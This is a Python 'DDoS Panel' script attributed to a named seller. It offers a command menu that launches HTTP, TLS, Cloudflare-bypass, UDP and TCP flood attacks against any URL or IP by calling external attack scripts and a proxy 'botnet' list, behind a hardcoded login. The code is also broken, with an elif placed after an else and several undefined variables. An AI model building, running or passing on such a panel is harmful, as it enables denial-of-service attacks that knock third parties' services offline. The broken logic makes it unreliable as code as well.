
## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def atas():
	print(' Its | Wellcome To Its DDoS Panel | Owner By: Lintar ')
	print('                     Botnets that we have : {bots}                      ')
	print("")

def logo():
	print(""" 
██▓▄▄▄█████▓  ██████       
▓██▒▓  ██▒ ▓▒▒██    ▒                    
▒██▒▒ ▓██░ ▒░░ ▓██▄                
░██░░ ▓██▓ ░   ▒   ██▒                    
░██░  ▒██▒ ░ ▒██████▒▒       
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
 ▒ ░    ░    ░ ░▒  ░ ░
 ▒ ░  ░      ░  ░  ░  
 ░                 ░  
                                      
 """)
	
def methods():
	print("""

» Layer7: 
	TLS <url> <time> <Rate> <threads>
	HTTP <url> <req_per_ip> <time>
	HTTP-MIX <url> <time>
	FLOOD <url> <threads> METHODS<get/post> <time>
	OMG <url> <time> <rps> <thread>
	CF-UAM <url> <time>
	UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>
	
» Layer4:         
	STRESS <ip> <port> <mode> <connection> <seconds> <timeout>
	TCP METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>
	UDP2 <ip> <port> <time>

» Tools:
	PAPING <ip> <port> <time

» Note: The methods will always be upgraded!
""")

def main():
    menu()
    while(True):
        cnc = input('''@Lintar\n ==>''')
        if cnc == "Methods" or cnc == "METHODS" or cnc == "methods" or cnc == "method" or cnc == "Method" or cnc == "METHOD":
            methods()

        elif "Help" in cnc:
            print(f'''
» Methods : To show methods 
» Clear: To clear all messages
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
# LAYER 7 METHODS

        elif "CF-UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-UAM.js {url} {time} 50 proxy.txt 100')
            except IndexError:
                print('Usage: CF-UAM <url> <time>')
                print('Example: CF-UAM http://example.com 100')       
                
        elif "UAMBYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                connect_per_thread = cnc.split()[4]
                os.system(f'node UAMBYPASS.js {url} {time} {ConnectPerThread} {proxies} {thread}')
            except IndexError:
                print('Usage: UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>')
                print('Example: UAMBYPASS <http://example.com> <60> <250> <proxy.txt> <1>')

        elif "OMG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: OMG <url> <time> <rps> <thread>')
                print('Example: OMG example.com 60 512 95500')

        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: FLOOD <url> <threads> METHODS<GET/POST> <time>')
                print('Example: FLOOD http://example.com 15000 get 60')
                
        elif "HTTP2" in cnc:
            try:
                url = cnc.split()[1]
                req_per_ip = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP2.js {url} {req_per_ip} {time}')
            except IndexError:
                print('Usage: HTTP2 <url> <req_per_ip> <time>')
                print('Example: HTTP2 https://example.com 512 120') 
                
        elif "TLS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node load.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS <url> <time> <Rate> <threads> ')
                print('Example: TLS example.com 120 1000 213')

        elif "HTTP-MIX" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'HTTP-MIX.js {Target} {time}')
            except IndexError:
                print('Usage: HTTP-MIX <url> <time>')
                print('Example: HTTP-MIX example.com 60')

# LAYER 4 METHODS

        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: STRESS <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 STRL4.py {ip} {port} {time}')
            except IndexError:
                print('Usage: UDP2 <ip> <port> <time>')
                print('Example: UDP2 4 1.1.1.1 443 120')

        elif "TCP" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: TCP METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# TOOLS

        elif "PAPING" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port> <time>')
                print('Example: paping 1.1.1.1 443 120')

# LOG-IN

def login():
    clear()
    user = "2"
    passwd = "2"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to Its DDoS Panel!!!...")
        time.sleep(0.3)
        main()

login()